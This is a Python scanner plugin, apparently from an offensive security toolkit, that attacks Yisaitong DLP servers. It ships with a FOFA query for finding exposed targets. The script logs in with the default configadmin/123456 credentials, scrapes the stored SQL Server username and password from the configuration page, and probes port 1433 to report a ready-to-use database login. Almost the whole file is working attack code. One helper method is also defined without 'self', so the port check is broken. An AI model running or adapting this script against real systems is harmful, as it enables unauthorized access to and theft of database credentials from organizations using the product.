#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import socket
import requests
from bs4 import BeautifulSoup
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        '''
            fofa: app="亿赛通DLP"
        '''
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'yst dlp burst'
        self.keyword = ['yst_dlp', 'burst']
        self.info = 'Burst yst_dlp burst.'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            sql_result  = None
            name = ''
            try:
                url = self.base_url+ '/CDGServer3/help/getEditionInfo.jsp'
                r = self.curl('get',url)
                if r :
                    res = r.text
                    soup = BeautifulSoup(res,'html5lib')
                    if '授权用户' in res:
                        name = soup.select('body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(6) > td:nth-of-type(2) > input[type="text"]')
                    else:
                        name = soup.select(
                            'body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(5) > td:nth-of-type(2) > input[type="text"]')
                    if len(name) > 0:
                        name = name[0]['value']
            except:
                name = ''

            try:
                url = self.base_url + '/CDGServer3/SystemConfig'
                _data = {'command':'Login','verifyCodeDigit':'dfd','name':'configadmin','pass':'123456'}
                r = self.curl('post',url,data = _data)
                if r :
                    res = r.content
                    soup = BeautifulSoup(res, 'html5lib')
                    sql_user = soup.select('#est\\.connection\\.username')[0]['value']
                    sql_pass = soup.select('#est\\.connection\\.password')[0]['value']
                    sql_result = name+ '/' + sql_user + '/' + sql_pass
            except:
                sql_result = None
            if sql_result:
                if self._socket_connect(self.target_host,1433):
                    sql_result = self.target_host + ":1433/" + sql_result
                self.flag = 1
                self.req.append({"page": url})
                self.req.append({"info": sql_result, "key": "configadmin/123456"})

    def _socket_connect(ip, port,msg = "test"):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            s.sendall(bytes(msg, 'utf-8'))
            # message = str(s.recv(1024))
            s.close()
            return True
        except:
            return False
